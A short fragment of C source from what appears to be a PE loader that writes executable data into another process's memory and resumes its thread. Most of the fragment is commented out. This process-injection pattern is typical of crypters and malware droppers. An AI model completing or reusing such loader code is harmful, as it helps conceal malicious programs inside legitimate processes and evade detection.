//			dwSecAdr = dwSecAdr + dwSecSz;
//			dwSecSz = dwOvrLen;
//			LPBYTE lpOvr = lpBuffer + dwOvrStart;
//			DPRINT3("LoaderPE: Overlay [0]=0x%X size 0x%X at addr:0x%X",lpOvr[0],dwSecSz,dwSecAdr);
//			if(NT_SUCCESS(pNtWriteVirtualMemory(pi.hProcess, (LPVOID)(dwSecAdr), lpOvr, dwSecSz,&dwTemp)))
//			{
//				DPRINT2("LoaderPE: Overlay Written at: 0x%X, Lenght: 0x%X",dwSecAdr,dwOvrLen);
//				/*if(NT_SUCCESS(pNtProtectVirtualMemory(pi.hProcess,(LPVOID*)&dwSecAdr,&dwOvrLen,PAGE_READWRITE,&dwaddr)))
//				{
//					DPRINT("LoaderPE: Overlay Protected");
//				}*/
//			}
//			/*char a[255];
//			sprintf(a,"0x%X - 0x%X",dwOvrStart,dwCodeSize - dwOvrStart);
//				MessageBoxA(NULL,a,0,0);*/
//		}
	Resumer(stAlloc.lpAddress,pinh,&pi,&ctx);
//	}
_L_Exit:
	pNtClose(pi.hProcess);
	ExitProcess(0x00F4FCFA);
	return dwParam;
}
#pragma code_seg(pop)